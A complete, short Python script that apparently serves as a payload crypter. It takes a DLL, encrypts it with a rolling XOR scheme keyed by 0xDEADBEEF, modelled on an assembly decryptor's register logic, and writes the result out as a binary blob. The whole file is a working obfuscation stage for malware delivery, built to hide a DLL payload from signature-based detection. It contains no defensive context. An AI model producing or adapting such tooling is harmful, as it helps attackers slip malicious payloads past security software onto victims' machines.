#!/usr/bin/env python3
import sys

def encrypt_payload(data: bytes, key: int = 0xDEADBEEF) -> bytes:
    buf = bytearray(data)
    ebx = key
    size = len(buf)
    for i in range(size):
        ecx = size - i
        plain = buf[i]
        cipher = plain ^ (ebx & 0xFF)
        buf[i] = cipher
        # 32-bit ROR 1
        ebx = ((ebx >> 1) | ((ebx & 1) << 31)) & 0xFFFFFFFF
        # XOR update low byte with ciphertext byte
        ebx = (ebx & ~0xFF) | (((ebx & 0xFF) ^ cipher) & 0xFF)
        ebx = (ebx + ecx) & 0xFFFFFFFF
    return bytes(buf)

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 encrypt.py <input_dll> <output_bin>")
        sys.exit(1)
    
    with open(sys.argv[1], "rb") as f:
        data = f.read()
    
    encrypted = encrypt_payload(data)
    with open(sys.argv[2], "wb") as f:
        f.write(encrypted)
    
    print(f"[+] Encrypted {len(data)} bytes -> {sys.argv[2]}")

if __name__ == "__main__":
    main()
